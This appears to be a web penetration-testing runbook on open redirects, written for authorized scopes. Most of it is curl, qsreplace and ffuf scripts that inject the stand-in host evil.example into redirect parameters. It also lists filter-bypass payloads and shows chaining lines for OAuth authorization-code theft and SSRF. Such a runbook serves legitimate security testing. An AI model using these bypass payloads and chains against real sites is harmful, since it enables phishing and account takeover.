---
title: "Open Redirect"
description: "Find and bypass open redirects, then chain them with OAuth, SSRF, and phishing for higher impact."
phase: Web
order: 53
tags:
  - redirect
  - phishing
  - oauth
  - ssrf
tools:
  - ffuf
  - qsreplace
  - curl
updated: 2026-10-01
---

A runbook for finding **open redirects** in an authorized scope. Goal: locate redirect parameters, bypass filters, and assess chaining with OAuth, SSRF, and phishing.

## 1. Find candidate parameters

Redirects hide in `next`, `url`, `redirect`, `return`, `returnUrl`, `continue`, `dest`, `r`, and in logout/login/OAuth callbacks.

```bash
URL='https://target/login?next=https://evil.example'
curl -s -D - -o /dev/null "$URL" | grep -i '^location:'
```

## 2. Automate parameter discovery and payload injection

Use `qsreplace` to inject a controlled host into every parameter, then `ffuf` to find which routes redirect.

```bash
cat urls.txt | qsreplace 'https://evil.example' | while read u; do
  loc=$(curl -s -D - -o /dev/null "$u" | grep -i '^location:' | tr -d '\r')
  [ -n "$loc" ] && echo "$u -> $loc"
done
ffuf -u 'https://target/FUZZ?next=https://evil.example' -w redirect-paths.txt -mc 301,302,303,307,308 -mr 'evil\.example'
```

## 3. Bypass host filters

Filters usually block the literal target host. Vary the form.

```bash
for p in '//evil.example' '/%5Cevil.example' 'https://target.evil.example' \
         'https://target@evil.example' 'https://evil.example#target' 'https:evil.example' \
         '//evil.example/%2f..' 'https://evil%2eexample'; do
  loc=$(curl -s -D - -o /dev/null "https://target/login?next=$(printf %s "$p" | jq -sRr @uri)" | grep -i '^location:' | tr -d '\r')
  echo "$p -> ${loc:-none}"
done
```

## 4. Probe allowlist substring tricks

If the filter only checks that the target contains the trusted host, embed it in a host you own.

```bash
for p in 'https://target.com.evil.example' 'https://evil.example/target.com' \
         'https://evil.example?target.com'; do
  curl -s -D - -o /dev/null "https://target/login?next=$(printf %s "$p" | jq -sRr @uri)" | grep -i '^location:'
done
```

## 5. Encode and case variations

Try double URL-encoding, mixed case, and trailing dots.

```bash
for p in 'https://evil.example' 'https://EVIL.example' 'https://evil.example.' \
         'https:%2f%2fevil.example' 'https:%252f%252fevil.example'; do
  curl -s -D - -o /dev/null "https://target/login?next=$p" | grep -i '^location:'
done
```

## 6. Chain for impact

Assess how the redirect can be abused in context.

```bash
# OAuth: steal an authorization code by redirecting the callback
curl -s -D - -o /dev/null 'https://target/oauth/authorize?client_id=app&redirect_uri=https://target/login?next=https://evil.example&response_type=code'
# SSRF: a server-side fetcher that follows redirects
curl -s 'https://target/fetch?url=https://target/login?next=https://evil.example' -o /dev/null -w '%{http_code}\n'
```

Also consider phishing credibility and referrer/header data carried onward.

## 7. Full pipeline (one block)

```bash
TARGET=https://target
# candidate parameters
for p in next url redirect return returnUrl continue dest r; do
  loc=$(curl -s -D - -o /dev/null "$TARGET/login?$p=https://evil.example" | grep -i '^location:' | tr -d '\r')
  echo "$p -> ${loc:-none}"
done
# bulk injection via qsreplace
cat urls.txt | qsreplace 'https://evil.example' | while read u; do
  loc=$(curl -s -D - -o /dev/null "$u" | grep -i '^location:' | tr -d '\r'); [ -n "$loc" ] && echo "$u -> $loc"
done
# ffuf route sweep
ffuf -u "$TARGET/FUZZ?next=https://evil.example" -w redirect-paths.txt -mc 301,302,303,307,308 -mr 'evil\.example'
# bypass forms
for p in '//evil.example' '/%5Cevil.example' 'https://target.evil.example' 'https://target@evil.example' 'https:evil.example' 'https://target.com.evil.example'; do
  enc=$(printf %s "$p" | jq -sRr @uri)
  echo "$p -> $(curl -s -D - -o /dev/null "$TARGET/login?next=$enc" | grep -i '^location:' | tr -d '\r')"
done
# chaining
curl -s -D - -o /dev/null "$TARGET/oauth/authorize?client_id=app&redirect_uri=$TARGET/login?next=https://evil.example&response_type=code"
curl -s -o /dev/null -w 'ssrf-chain %{http_code}\n' "$TARGET/fetch?url=$TARGET/login?next=https://evil.example"
```

## Ethics & legality

- Only test redirect endpoints in an official scope or with written authorization.
- Redirect only to a domain you control; never send real users to attacker pages.
- Capture the `Location` header as evidence and note the working parameter/bypass.
